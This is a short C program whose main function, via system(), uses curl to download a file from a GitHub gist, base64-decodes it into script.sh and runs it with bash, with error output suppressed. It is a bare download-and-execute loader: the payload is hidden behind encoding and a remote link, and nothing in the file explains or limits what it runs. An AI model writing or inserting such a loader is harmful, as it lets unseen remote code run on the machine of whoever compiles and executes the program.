#include <stdlib.h>

int	main()
{
	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/f710a93c7e312eca6e8a4577a88ce0b0ba7ddaf3/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
}
